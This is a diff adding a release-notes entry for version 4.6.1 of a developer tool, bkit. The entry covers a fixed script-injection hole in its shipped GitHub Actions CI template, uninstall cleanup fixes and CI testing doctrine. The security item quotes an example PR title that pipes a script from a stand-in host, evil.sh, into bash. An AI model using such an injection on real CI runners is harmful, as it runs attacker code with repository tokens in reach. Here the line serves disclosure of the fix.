@@ -6,6 +6,23 @@ Format: `## [version] — YYYY-MM-DD`
 
 ---
 
+## [4.6.1] — 2026-07-16
+
+A post-release audit of the two surfaces 4.6.0's pre-release audit ran out of turns on — uninstall footprint and guardrail parity — surfaced a script-injection in the shipped CI template and two uninstall-footprint gaps. Also syncs the CI scaffold and testing doctrine with the source-of-truth consumer's cross-lane file-execution report.
+
+### Security
+
+- **The shipped `ci.yml` template interpolated the PR title into a shell `run:` body, allowing script injection on a consumer's CI runner.** Both `Detect Direct Push` steps expanded `${{ github.event.pull_request.title }}` straight into the script text, so a PR titled `"; curl evil.sh | bash; "` executed on the runner (with `GH_TOKEN` in step env). bkit's own `ci.yml` already used the injection-safe `env:` pattern — the fix had never reached the template it ships. The title (plus `github.event_name` / `github.ref`) now arrives through `env:` at both sites, and a test asserts the inline form stays gone so a snapshot update cannot silently reintroduce it. `ci.yml` is Tier-3 seed-or-print, so existing consumers are **not** auto-rewritten — re-seed or hand-apply the `env:` pattern to your `Detect Direct Push` steps.
+
+### Fixed
+
+- **A full `bkit uninstall` orphaned bkit's own doctrine files and scripts.** `.agents/{config,docs,rules,skills}.md` and `.bkit/scripts/bkit-*` install via the core templates pass, not the manifest, so no uninstall verb could reach them — a full teardown left bkit's canonical rules and helper scripts behind. They are now removed on a full/core uninstall: the doctrine `.md` via strip-block (preserving any consumer content below `bkit:end`, exactly like the root `AGENTS.md`), the scripts by glob. A targeted `uninstall --tooling` / `--claude` still leaves core untouched, and `--nuke` removes everything.
+- **Uninstall left empty bkit-authored directories behind.** `.claude/agents`, `.github/workflows`, `.husky`, `.vale/styles/House`, `.bkit/scripts` and their siblings are now pruned when the deletions leave them empty — deepest-first, and only when a directory is genuinely empty, so one still holding consumer files is never touched.
+
+### Changed
+
+- **CI scaffold + testing doctrine reference the cross-lane file-execution report.** The `bkit-tests-check` capstone is the only job that `needs:` every lane, so it is the only place to catch a test file that has stopped running in _every_ lane — renamed out of its glob, moved to a lane whose filter excludes it, or left on a stale `skipIf` — where each lane stays green, the per-tier count still looks plausible, and the coverage is silently gone. The scaffold's capstone gains a suggestion comment for the optional, non-blocking report (reconcile the on-disk test-file inventory against the union of files executed across all lanes; full-runs-only; report-then-assert), and `docs/testing.md` § "Validated means executed" gains the matching doctrine. The capstone's assertion prose now also lists `build` as a result-only lane (no `*_ran` count).
+
 ## [4.6.0] — 2026-07-16
 
 Hardens the workflow kernel and the JSONL telemetry ledgers that landed in 4.5.0, and adopts a measured consumer's flat CI lane DAG. Running the ledgers against live consumer repos turned up defects the ledgers themselves recorded: ship merged a PR to `dev` while CI was concluding **failure** (a 403'd status query was silently graded a pass), merged work could be stranded unrecoverable past the point of no return, concurrent runs of _different_ features corrupted each other's `dev` operations with zero per-FID contention, and every compliance row bkit has ever written graded an **empty diff**. Telemetry rows gain the provenance and severity needed to slice them, and five divergent inline-bash summaries collapse into one command. Separately, a consumer measured their pipeline at 26.7 → 11.0 min (−59%) — the shipped CI scaffold now reflects what that measurement actually found.
